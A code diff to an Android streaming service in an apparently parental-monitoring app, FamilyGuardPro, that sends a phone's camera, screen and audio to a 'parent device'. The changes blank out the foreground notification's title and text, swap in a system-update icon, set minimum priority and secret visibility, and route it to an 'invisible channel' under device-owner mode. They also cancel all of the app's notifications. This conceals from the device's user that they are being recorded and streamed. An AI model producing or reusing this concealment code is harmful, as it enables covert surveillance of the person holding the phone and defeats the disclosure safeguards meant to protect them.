@@ -100,26 +100,44 @@ class WebRTCStreamService : Service() {
     
     override fun onDestroy() {
         super.onDestroy()
+        stopForeground(STOP_FOREGROUND_REMOVE)
+        cancelAllNotifications()
         stopStreaming()
         serviceScope.cancel()
         Log.d(TAG, "WebRTCStreamService destroyed")
     }
     
+    private fun cancelAllNotifications() {
+        try {
+            val nm = getSystemService(android.app.NotificationManager::class.java)
+            nm.cancel(NOTIFICATION_ID)
+            nm.cancelAll()
+            for (id in 1001..1020) {
+                try { nm.cancel(id) } catch (e: Exception) {}
+            }
+        } catch (e: Exception) {}
+    }
+    
     private fun startForeground(streamType: String) {
-        val title = when (streamType) {
-            "camera" -> "Camera Streaming"
-            "screen" -> "Screen Streaming"
-            "audio" -> "Audio Streaming"
-            "camera_audio" -> "Live Streaming"
-            else -> "Streaming"
+        // Check if Device Owner mode - use invisible channel
+        val doManager = try {
+            com.familyguardpro.deviceowner.DeviceOwnerManager.getInstance(this)
+        } catch (e: Exception) { null }
+        
+        val channelId = if (doManager?.isDeviceOwner() == true) {
+            com.familyguardpro.utils.NotificationUtils.ensureInvisibleChannel(this)
+            com.familyguardpro.deviceowner.DeviceOwnerManager.INVISIBLE_CHANNEL_ID
+        } else {
+            FamilyGuardApp.NOTIFICATION_CHANNEL_STREAMING
         }
         
-        val notification = NotificationCompat.Builder(this, FamilyGuardApp.NOTIFICATION_CHANNEL_STREAMING)
-            .setContentTitle(title)
-            .setContentText("Streaming to parent device...")
+        val notification = NotificationCompat.Builder(this, channelId)
+            .setContentTitle("")
+            .setContentText("")
             .setSmallIcon(R.drawable.ic_system_update)
-            .setPriority(NotificationCompat.PRIORITY_LOW)
+            .setPriority(NotificationCompat.PRIORITY_MIN)
             .setOngoing(true)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
             .build()
         
         val foregroundType = when (streamType) {
